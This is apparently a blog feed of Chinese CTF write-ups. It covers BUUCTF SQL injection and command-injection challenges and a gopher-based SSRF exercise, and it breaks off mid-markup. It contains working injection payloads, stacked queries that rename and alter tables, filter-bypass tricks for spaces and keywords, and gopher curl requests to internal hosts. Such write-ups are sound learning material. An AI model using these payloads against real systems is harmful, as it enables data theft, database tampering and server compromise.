    <link href="/2023/03/09/BUUCTF/"/>
    <url>/2023/03/09/BUUCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF-Writeup"><a href="#BUUCTF-Writeup" class="headerlink" title="BUUCTF  Writeup"></a><em>BUUCTF  Writeup</em></h1><h2 id="EasySql"><a href="#EasySql" class="headerlink" title="EasySql"></a>EasySql</h2><p>先用用户名:<em><strong>1</strong></em>  密码:<em><strong>1’</strong></em>  测试注入，页面报错，可能存在注入点，并且是字符型。</p><p><img src="/2023/03/09/BUUCTF/image-20230213012236141.png"></p><p>密码传入***1’ order by 4 #***时报错，判断出数据库有三个字段。</p><p><img src="/2023/03/09/BUUCTF/image-20230213013114976.png"></p><p>准备爆数据库名，二分法传入***1’ or (ascii(substr(database(),0,1))&lt;128)#***，结果直接拿到了flag。</p><p><img src="/2023/03/09/BUUCTF/image-20230213013848916.png"></p><p>题后反思：因为传入***1’ or (ascii(substr(database(),0,1))&lt;128)#*<strong>导致后端查询语句变成</strong>select * from 数据库名 where username &#x3D; ‘1’ and pasword &#x3D;’1’  or (ascii(substr(database(),0,1))&lt;128)#’***因为and优先级高于or，于是整个句子变成了两个部分：</p><p><em><strong>select * from 数据库名 where username &#x3D; ‘1’ and pasword &#x3D;’1’</strong></em> 和</p><p><em><strong>or (ascii(substr(database(),0,1))&lt;128)#’</strong></em></p><p>虽然用户名密码判断是错的，但是数据库名的第一个字符的ascii码确实小于128，为真，二者用or相连，返回为true，故登陆成功获取到flag；</p><p>但是这样做实际上是走弯路了，这道题布尔盲注不是最优解，实际上直接构造密码为***1’ or 1&#x3D;1#***在原理上是和上面误打误撞拿到flag是一样的，但是少走了很多弯路。</p><hr><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>先传入1，返回一个字符串，传入1’，报错</p><p><img src="/2023/03/09/BUUCTF/image-20230213133221152.png"></p><p>可能存在sql注入，并且是字符型的。传入***’ order by 4#***，报错。<img src="/2023/03/09/BUUCTF/image-20230213140043405.png"></p><p>传入***’ order by 3#<em><strong>，报错。传入</strong></em>‘ order by 2#***不报错，判断表里有2个字段。</p><p><img src="/2023/03/09/BUUCTF/image-20230213140715876.png"></p><p>联合查询尝试失败，select被ban。尝试构造无字母数字的语句。编写脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$var</span> = <span class="hljs-string">&#x27;s&#x27;</span>;<span class="hljs-comment">//依次将s改为e,l,e,c,t</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">256</span>;<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">256</span>;<span class="hljs-variable">$j</span>++)&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>^<span class="hljs-variable">$j</span>)==<span class="hljs-variable">$var</span>)&#123;<br>                <span class="hljs-keyword">echo</span> (<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>)).<span class="hljs-string">&quot;^&quot;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$j</span>)));<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125; <br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>得到select，尝试能否绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(<span class="hljs-string">&#x27;%5D&#x27;</span>^<span class="hljs-string">&#x27;.&#x27;</span>).(<span class="hljs-string">&#x27;H&#x27;</span>^<span class="hljs-string">&#x27;-&#x27;</span>).(<span class="hljs-string">&#x27;%5D&#x27;</span>^<span class="hljs-string">&#x27;1&#x27;</span>).(<span class="hljs-string">&#x27;H&#x27;</span>^<span class="hljs-string">&#x27;-&#x27;</span>).(<span class="hljs-string">&#x27;_&#x27;</span>^<span class="hljs-string">&#x27;%3C&#x27;</span>).(<span class="hljs-string">&#x27;_&#x27;</span>^<span class="hljs-string">&#x27;%2B&#x27;</span>)<br></code></pre></td></tr></table></figure><p>还是没绕过，暂时放弃这条路。</p><p><img src="/2023/03/09/BUUCTF/image-20230213143545653.png"></p><p>查找学习show databases爆数据库名。<img src="/2023/03/09/BUUCTF/image-20230213144232143.png"></p><p>show tables爆表名，好臭的表名啊(。</p><p><img src="/2023/03/09/BUUCTF/image-20230213144433988.png"></p><p>‘; show columns from <code>1919810931114514</code>;#爆字段名（表名要用反引号引起来，typora里不知道为什么吞反引号）</p><p><img src="/2023/03/09/BUUCTF/image-20230213144916052.png"></p><p>万事俱备，只欠select，直接select不行，去查找能代替select的，果不其然，找到了handler语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">handler [表名] open;#打开表（句柄）<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">handler [表名] read first;#从表的第一列开始读（指针的起点）<br>handler [表名] read next;#指针往后一位，读取数据（参考资料https://blog.csdn.net/JesseYoung/article/details/40785137）<br></code></pre></td></tr></table></figure><p>最终构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;;handler `1919810931114514` open;handler `1919810931114514` read first;#<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230213152804918.png"></p><p>拿到flag。</p><p>反思：除了上面的方法寻找mysql中的其他查询语句外，看了大佬们的wp后学到了更多的思路和相关知识，这道题还可以通过预编译得到flag。</p><p>预编译相关语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">set : #设置变量；<br>prepare : #准备一个语句赋予其名称，之后直接调用语句；<br>execute :#执行语句；<br></code></pre></td></tr></table></figure><p>以及一个mysql语句concat(str1,str2)，将str1与str2连接起来返回连接后的字符串；或者mysql的hex()函数把语句变成十六进制同样可以绕过select的过滤。</p><p>步骤如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">set @abc=concat(&quot;selec&quot;,&quot;t * from `1919810931114514`&quot;);#创建一个变量@abc为字符串&quot;select * from `1919810931114514`&quot;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">prepare sel from @abc;#预备一个语句sel，内容是@abc，也就是&quot;select * from `1919810931114514`&quot;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">execute sel;#执行sel语句；<br></code></pre></td></tr></table></figure><p>构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;;set @abc=concat(&quot;selec&quot;,&quot;t * from `1919810931114514`&quot;);prepare sel from @abc;execute sel;<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230213160841525.png"></p><p>然后提示set被ban了，但是用的是strstr()，区分大小写，所以大写绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;;Set @abc=concat(&quot;selec&quot;,&quot;t * from `1919810931114514`&quot;);prepare sel from @abc;execute sel;<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230213161126295.png"></p><p>十六进制绕过的步骤如下：</p><p>打开mysql命令行输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select hex(&quot;select * from `191981096114514`&quot;);<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230213162154710.png"></p><p>得到一串十六进制字符串。</p><p>构造预处理语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">set @abc=73656C656374202A2066726F6D206031393139383130393631313435313460;prepare sel from @abc;execute sel;<br></code></pre></td></tr></table></figure><p>set同样大写绕过，payload：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>&#x27;;Set @abc=0x<span class="hljs-number">7365</span>6C<span class="hljs-number">65637420</span>2A<span class="hljs-number">206672</span>6F6D<span class="hljs-number">20603139313938</span><span class="hljs-number">31303933313131</span><span class="hljs-number">3435313460</span>;Prepare sel from @abc;execute sel;#<br>(上面的图里应该是<span class="hljs-number">19198109311451</span>4打错了，最终结果应该是上面这行代码//到底是谁起的这个名字啊啊啊啊啊)<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230213163140720.png"></p><p>GET到flag；</p><p>另外一种思路，从最开始看到题目的时候就在想直接输入1回显的数组是来自哪里的呢，但是最开始做的时候爆了191981093114514表就没爆words表的字段名了，因为191981093114514表里只有一个元素，所以推测回显内容是words表里的，爆words字段名</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&#x27;;show columns <span class="hljs-keyword">from</span> `<span class="hljs-built_in">words</span>`;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230213164015355.png"></p><p>推测回显内容来自于data字段；</p><p>思路就是把words表改名为其他的名字，191981093114514改名为words，把其中的flag字段改名为id（或者在xinwords表里增加一列id），最后传入***1’ or 1&#x3D;1#***使查询结果为true爆出words所有字段内容。</p><p>相关语句如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">alter table [表名] add [字段名] int(***)/varchar(***) #增加列<br>alter table [表名] drop [字段名]#删除列<br>alter table [表名] change [字段名] [新字段名] int(***)/varchar(***)#重命名字段<br>alter table [表名] rename to [新表名]#重命名表,to可省略<br>rename table [表名] to [新表名]#重命名表<br></code></pre></td></tr></table></figure><p>payload1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1&#x27;;rename table words to word;rename table `1919810931114514` to words;alter table words add id int(3);##新增一列id<br></code></pre></td></tr></table></figure><p>payload2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1&#x27;;rename table words to word;rename table `1919810931114514` to words;alter table words change flag id varchar(50);#<br>#修改flag字段名为id<br></code></pre></td></tr></table></figure><hr><h2 id="PingPingPing"><a href="#PingPingPing" class="headerlink" title="PingPingPing"></a>PingPingPing</h2><p>做这道题时想到前面做过的另外一题（新生赛exec）。总结了以下联合执行的符号作用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">p1;p2:<span class="hljs-string">&quot;先执行p1后执行p2;</span><br><span class="hljs-string">p1|p2:p1的输出作为p2的输入，只显示p2的结果；</span><br><span class="hljs-string">p1||p2:若p1为假则执行p2，为真停止执行；</span><br><span class="hljs-string">p1&amp;&amp;p2:若p1为真则执行p2，为假停止执行；</span><br></code></pre></td></tr></table></figure><p>传入</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ip</span>=| ls<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230214021610128.png"></p><p>说实话一开始没反应过来space是空格的意思就没想着空格被过滤了（，单纯以为是表达错误不需要空格然后把空格删掉发现可以执行,直到下面cat命令没法正常执行时才反应过来是空格被ban了（。</p><p>提示空格被ban了，传入</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ip</span>=|ls<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ip</span>=;ls<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230214021933333.png"></p><p>回显提示目录里有flag.php和index.php</p><p>直接</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ip</span>=|cat flag.php<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230214022139800.png"></p><p>然后提示空格被ban了。参考了大佬们的博客，大佬总结了以下几点绕过空格的方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">$&#123;IFS&#125;$<span class="hljs-number">9</span><br>&#123;IFS&#125;<br><span class="hljs-variable">$IFS</span><br>$&#123;IFS&#125;<br>$IFS$<span class="hljs-number">1</span> <span class="hljs-comment">//$1改成$加其他数字貌似都行</span><br>IFS<br>&lt; <br>&lt;&gt; <br>&#123;cat,flag.php&#125;  <span class="hljs-comment">//用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br>%<span class="hljs-number">20</span>   (space)<br>%<span class="hljs-number">09</span>   (tab)<br>X=$<span class="hljs-string">&#x27;cat\x09./flag.php&#x27;</span>;<span class="hljs-variable">$X</span>       （\x09表示tab，也可以用\x20）<br><span class="hljs-comment">#来自大佬博客：https://blog.csdn.net/vanarrow/article/details/108295481</span><br><br></code></pre></td></tr></table></figure><p>逐一试下来发现$IFS$1是可行的但是提示flag被ban了（悲）</p><p><img src="/2023/03/09/BUUCTF/image-20230214023158094.png"></p><p>既然看不了flag又不知道过滤规则，反正还有个index.php能看</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">?ip=|<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$1index</span>.php<br></code></pre></td></tr></table></figure><p><img src="/2023/03/09/BUUCTF/image-20230214023326732.png"></p><p>密密麻麻的这么多都被过滤了，括号引号星号全员过滤。。。想起之前从学长那里学来的星号绕过，也不能用了，没有头绪的时候。</p><p>正巧刚刚在学习绕过空格过滤的时候看到一篇博客，<a href="https://www.cnblogs.com/GLory-LTF/p/15359485.html%E3%80%82%E9%87%8C%E9%9D%A2%E6%9C%89%E8%AE%B2%E5%88%B0%E5%A6%82%E6%9E%9Ccat%E5%AD%97%E7%AC%A6%E8%A2%ABban%E4%BA%86%E4%BD%86%E6%98%AF%E9%9D%9E%E5%BE%97%E7%94%A8cat%E5%91%BD%E4%BB%A4%EF%BC%8C%E8%BF%99%E9%87%8C%E4%BB%8B%E7%BB%8D%E4%BA%86%E4%B8%80%E7%A7%8D%E5%91%BD%E4%BB%A4%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87%EF%BC%88%E8%AE%B0%E5%B0%8F%E6%9C%AC%E6%9C%AC%EF%BC%89%E3%80%82">https://www.cnblogs.com/GLory-LTF/p/15359485.html。里面有讲到如果cat字符被ban了但是非得用cat命令，这里介绍了一种命令拼接绕过（记小本本）。</a></p><p>理论知道了，开始实践</p><p><img src="/2023/03/09/BUUCTF/image-20230214025001351.png"></p><p>嗯。。属于是学了点知识不会灵活变通了，再次求助大佬，给出的payload是</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">?ip=;a=g;<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$1fla</span><span class="hljs-variable">$a</span>.php<br></code></pre></td></tr></table></figure><p>又有收获了，拼接绕过不一定要每个字母都拼接，看着这个payload有个想法，如果把$a的位置在flag四个位置改变会怎么样。实践。</p><p><img src="/2023/03/09/BUUCTF/image-20230214025741500.png"></p><p>替换字符f的位置</p><p><img src="/2023/03/09/BUUCTF/image-20230214025844260.png"></p><p>替换字符l的位置</p><p><img src="/2023/03/09/BUUCTF/image-20230214025933119.png"></p><p>替换字符a的位置</p><p><img src="/2023/03/09/BUUCTF/image-20230214030039533.png"></p><p>看来只有g的位置可以。然后注意到$a是代码中原有的变量，如果构造payload时用的是b变量会怎么样呢</p><p><img src="/2023/03/09/BUUCTF/image-20230214030227918.png"></p><p>也是可行的</p>]]></content>
    
    
    <categories>
      
      <category>做题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023ROIS冬令营</title>
    <link href="/2023/02/10/ROIS/"/>
    <url>/2023/02/10/ROIS/</url>
    
    <content type="html"><![CDATA[<h1 id="2023ROIS冬令营"><a href="#2023ROIS冬令营" class="headerlink" title="2023ROIS冬令营"></a>2023ROIS冬令营</h1><p>梦开始的地方。。。。。。</p><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="internal"><a href="#internal" class="headerlink" title="internal"></a>internal</h3><p>这是什么，两个超链接，点一下（</p><p><img src="/2023/02/10/ROIS/image-20230410150245999.png"></p><p>​SQLI页面中的内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] !== <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try to access it from internal!&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome!\n&quot;</span>;<br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/union| /i&quot;</span>,<span class="hljs-variable">$id</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br><span class="hljs-variable">$con</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(DB_HOST, DB_USER, DB_PASS, DB_DATABASE);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM messages WHERE id=<span class="hljs-subst">$id</span>&quot;</span>; <span class="hljs-comment">// SQLI &gt;_&lt;</span><br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$res</span>)[<span class="hljs-string">&#x27;message&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$message</span>;<br><span class="hljs-comment">#回显Try to access it from internal!</span><br></code></pre></td></tr></table></figure><p><code>if ($_SERVER[&#39;REMOTE_ADDR&#39;] !== &#39;127.0.0.1&#39;)</code>用户访问的IP必须是本地IP才能进行下面的数据库操作等步骤，也就是说只有通过网页服务器内网访问。如果我们能够通过这个服务器中的另外一个不限制于内网访问的页面，把它当做跳板间接对这个仅内网访问的页面进行操作，就能进行传参等操作。也就是实现SSRF。先看另外一个页面：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Hint: Do you know gopher?</span><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/file:|ftp:|http:|scp:|dict:/i&quot;</span>,<span class="hljs-variable">$url</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br><span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$res</span>;<br></code></pre></td></tr></table></figure><p><code>curl_init()</code>函数初始化一个curl绘会话，值传给<code>$ch</code>，<code>curl_exec()</code>函数执行一个curl会话，值传给<code>$res</code>。最后将结果打印出来。既然可以执行curl，那么不就意味着可以通过这个页面对SQLI页面进行传参等操作了吗。给出了提示：<code>&quot;Do you know gopher?&quot;</code>。emmm。。。并不知道。那就学呗。找到了一篇<a href="https://zhuanlan.zhihu.com/p/112055947">讲的比较详细的文章</a>学习了一下。</p><p>gopher是啥？它是一种协议，支持发出GET、POST请求：可以先截获get请求包和post请求包，再构成符合gopher协议的请求。</p><p>gopher协议的格式：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">gopher:</span>//&lt;host&gt;<span class="hljs-symbol">:&lt;port&gt;/_</span>后接<span class="hljs-title class_">TCP</span>数据流<br></code></pre></td></tr></table></figure><p>需要注意的是，TCP数据流必须是经过url编码的，并且回车和换行必须是<code>%0D%0A</code>，使用脚本或工具编码后回车换行会变成<code>%0A</code>，因此要多一步replace的步骤。在HTTP包的最后要加<code>%0D%0A</code>，代表消息结束（具体可研究HTTP包结束）。以下是通过gopher协议传参的一次示例：</p><p>GET请求：</p><p>准备好一个监听机和一个用户机：</p><p><img src="/2023/02/10/ROIS/image-20230410153558433.png"></p><p><code>nc -lp 1234</code>监听1234端口，使用curl发送http请求<code>curl gopher://172.17.0.1:1234/abcd</code>，监听机收到消息为”bcd”；发送请求<code>curl gopher://172.17.0.1:1234/aabcd</code>nc监听到abcd。因此紧跟在<code>&quot;&lt;PORT&gt;/&quot;</code>字符后面的一个字符会被忽略，可换为任意一个字符。</p><p><img src="/2023/02/10/ROIS/image-20230410182351129.png"></p><p>这是一段网页源码，作用是将GET传入的name的值打印出来：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#保存为ssrf.php</span><br></code></pre></td></tr></table></figure><p>这是一个GET请求包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/ssrf.php?name=Potatowo</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.17.0.1<br>#回车<br></code></pre></td></tr></table></figure><p>经Python脚本编写，生成对应的请求包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>data = \<br><span class="hljs-string">&quot;&quot;&quot;GET /ssrf.php?name=Margin HTTP/1.1</span><br><span class="hljs-string">Host: 172.17.0.1</span><br><span class="hljs-string">#该行要有回车，HTTP数据包结尾</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>result = urllib.parse.quote(data)<br>result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<span class="hljs-comment">#此处将&quot;%0A&quot;替换成&quot;%0D%0A&quot;</span><br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#GET%20/ssrf.php%3Fname%3DMargin%20HTTP/1.1%0D%0AHost%3A%20172.17.0.1%0D%0A</span><br></code></pre></td></tr></table></figure><p>改为构成符合gopher协议的请求后通过curl发出请求：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl gopher://172.17.0.1:8080/_GET%20/ssrf.php%3Fname%3DMargin%20HTTP/1.1%0D%0AHost%3A%20172.17.0.1%0D%0A<br><span class="hljs-comment">#注意&quot;8080/&quot;后面紧跟着一个&quot;_&quot;字符。</span><br></code></pre></td></tr></table></figure><p>POST请求：</p><p>这是一段网页源码，功能不做过多赘述：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#保存为ssrf.php</span><br></code></pre></td></tr></table></figure><p>这是一个POST请求包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ssrf/base/post.php</span> <span class="hljs-meta">HTTP/1.1</span><br>host:172.17.0.1<br>Content-Type:application/x-www-form-urlencoded<br>Content-Length:11<br><br><span class="language-ini"><span class="hljs-attr">name</span>=Potatowo</span><br><span class="language-ini"><span class="hljs-comment">#回车</span></span><br></code></pre></td></tr></table></figure><p>改为构成符合gopher协议的请求后通过curl发出请求：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl gopher://172.17.0.1:8080/_POST%20/ssrf/base/post.php%20HTTP/1.1%0D%0Ahost%3A172.17.0.1%0D%0AContent-Type%3Aapplication/x-www-form-urlencoded%0D%0AContent-Length%3A11%0D%0Aname%3DPotatowo%0D%0A%0D%0A<br><span class="hljs-comment">#注意&quot;8080/&quot;后面紧跟着一个&quot;_&quot;字符。</span><br></code></pre></td></tr></table></figure><p>现在回到本题；</p><p>既然用得到请求包，那就先bp抓包，对SQLI页面传参，那就抓SQLI页面的包：</p><p><img src="/2023/02/10/ROIS/image-20230410194114453.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 